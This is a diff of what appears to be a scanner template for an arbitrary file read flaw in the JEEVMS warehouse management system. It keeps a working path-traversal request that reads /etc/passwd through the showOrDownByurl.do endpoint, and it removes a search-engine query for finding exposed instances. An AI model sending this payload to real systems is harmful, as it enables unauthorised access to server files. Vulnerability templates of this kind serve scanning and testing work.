@@ -3,14 +3,8 @@ info:
   name: JEEVMS仓库管理系统showOrDownByurl存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/814e262ef657725e3029d5e70cbf905e
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 814e262ef657725e3029d5e70cbf905e
-    fofa: + fofa`body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro"`
 http:
 - raw:
   - 'GET /systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd HTTP/1.1
